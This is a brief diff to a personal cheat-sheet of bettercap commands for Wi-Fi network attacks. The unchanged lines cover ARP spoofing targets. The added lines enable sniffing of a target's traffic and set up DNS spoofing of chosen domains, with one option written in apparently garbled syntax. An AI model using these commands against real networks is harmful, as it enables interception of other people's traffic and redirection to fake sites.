@@ -2,6 +2,11 @@ to launch: sudo bettercap -iface wlan0
 start network probing: net.probe on
 show computers on network: net.show
 set target for arp spoof: set arp.spoof.targets [TARGET IP]
+veiw all packets going through target: net.sniff on
+
+DNS spoofing attack
+set websites to redirect from: set.dns.spoof.domains [target domain]
+enable: dns.spoof on
 
 tags:
 save output to log file: --log log.txt 
